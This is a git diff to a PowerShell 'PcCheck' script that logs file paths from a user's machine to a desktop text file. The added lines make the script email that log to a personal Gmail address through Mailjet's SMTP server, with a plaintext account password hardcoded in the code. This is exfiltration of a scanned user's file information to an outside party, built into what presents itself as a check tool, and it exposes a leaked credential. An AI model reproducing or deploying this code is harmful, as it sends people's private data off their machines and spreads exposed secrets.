@@ -272,26 +272,44 @@ function Main {
         $zipRarFiles | ForEach-Object { Add-Content -Path $outputFile -Value $_.FullName }
     }
 
-    $sendMailMessageSplat = @{
-    From = 'Sherm <andrew.p.sherman21@gmail.com>'
-    To = 'Sherm <andrew.p.sherman21@gmail.com>'
-    Subject = 'PcCheckLogs'
-    Body = "Forgot to send the attachment. Sending now."
-    Attachments = 'PcCheckLogs.txt'
-    Priority = 'High'
-    DeliveryNotificationOption = 'OnSuccess', 'OnFailure'
-    SmtpServer = 'in-v3.mailjet.com'
-}
-Send-MailMessage @sendMailMessageSplat
     $desktopPath = [System.Environment]::GetFolderPath('Desktop')
-    $logFilePath = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
-    
-    if (Test-Path $logFilePath) {
-        Set-Clipboard -Path $logFilePath
-        Write-Host "Log file copied to clipboard." -ForegroundColor Green
-    } else {
-        Write-Host "Log file not found on the desktop." -ForegroundColor Red
+$logFilePath = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
+
+# Define email parameters
+$smtpServer = "smtp.mailjet.com"   
+$smtpPort = 587                                
+$fromAddress = "andrew.p.sherman21@gmail.com"        
+$toAddress = "andrew.p.sherman21@gmail.com"     
+$subject = "PcCheck Log File"
+$body = "Please find attached the PcCheckLogs.txt file."
+
+# Check if the file exists and send email
+if (Test-Path $logFilePath) {
+    $attachment = New-Object Net.Mail.Attachment($logFilePath)
+    $message = New-Object Net.Mail.MailMessage
+    $message.From = $fromAddress
+    $message.To.Add($toAddress)
+    $message.Subject = $subject
+    $message.Body = $body
+    $message.Attachments.Add($attachment)
+
+    $smtpClient = New-Object Net.Mail.SmtpClient($smtpServer, $smtpPort)
+    $smtpClient.EnableSsl = $true
+    $smtpClient.Credentials = New-Object System.Net.NetworkCredential("andrew.p.sherman21@gmail.com", "Esp0sa1432**") 
+
+    try {
+        $smtpClient.Send($message)
+        Write-Host "Email sent with log file attached." -ForegroundColor Green
     }
+    catch {
+        Write-Host "Failed to send email: $_" -ForegroundColor Red
+    }
+
+    # Dispose of attachment after sending
+    $attachment.Dispose()
+} else {
+    Write-Host "Log file not found on the desktop." -ForegroundColor Red
+}
 
     $userProfile = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
     $downloadsPath = Join-Path -Path $userProfile -ChildPath "Downloads"
